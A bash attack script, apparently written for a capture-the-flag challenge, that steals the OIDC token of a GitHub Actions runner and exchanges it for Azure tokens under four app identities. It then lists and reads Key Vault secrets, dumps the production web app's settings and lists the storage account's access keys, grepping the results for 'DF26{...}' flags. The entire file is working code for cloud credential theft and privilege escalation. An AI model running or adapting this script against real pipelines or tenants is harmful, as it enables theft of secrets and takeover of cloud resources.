#!/usr/bin/env bash
set +e
say(){ echo "$*"; }
T="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG="rg-tbl-platform-prod-sea"
J=$(curl -sS -m 25 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
  python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
say "oidc_len=${#J}"
[ -n "$J" ] || { say NO_OIDC; exit 0; }

fic_tok(){ curl -sS -m 25 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$1" -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$J" --data-urlencode "scope=$2" | \
  python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }

for pair in \
  "891fb158-e02c-4428-a885-53b811f369c0:legacy-admin" \
  "58108da8-044e-4d7e-9a46-92e6179b30be:secrets-sync" \
  "462d1c38-4459-48b8-9333-82e389e59514:platform-automation" \
  "72ff278a-9e71-43ec-bac4-2ca303f8e462:cicd-deployer"; do
  APPID="${pair%%:*}"; NAME="${pair##*:}"
  VT=$(fic_tok "$APPID" "https://vault.azure.net/.default")
  AT=$(fic_tok "$APPID" "https://management.azure.com/.default")
  say "FIC_${NAME}_vault_len=${#VT} arm_len=${#AT}"
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    L=$(curl -sS -m 20 -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets?api-version=7.4")
    say "LIST_${NAME}_${V}=$(echo "$L" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([x["id"].split("/")[-1] for x in d.get("value",[])][:20])' 2>/dev/null || echo ERR)"
    for S in flag platform-flag df26-flag challenge-flag tbl-flag legacy-admin-principal; do
      R=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets/$S?api-version=7.4")
      echo "$R" | grep -oE 'DF26\{[^}]+\}' && say "FLAG_HIT_${NAME}_${V}_${S}"
    done
  done
  if [ -n "$AT" ]; then
    AS=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{}' \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01")
    echo "$AS" | grep -oE 'DF26\{[^}]+\}' && say FLAG_IN_APPSETTINGS
    echo "$AS" | grep -i CONFIG_STORAGE | head -3
    LK=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' -d '{}' \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01")
    echo "$LK" | python3 -c 'import sys,json;d=json.load(sys.stdin);print("appcfg_keys",len(d.get("keys",[])))' 2>/dev/null || say "appcfg_listkeys_fail_${NAME}"
  fi
done
say DONE
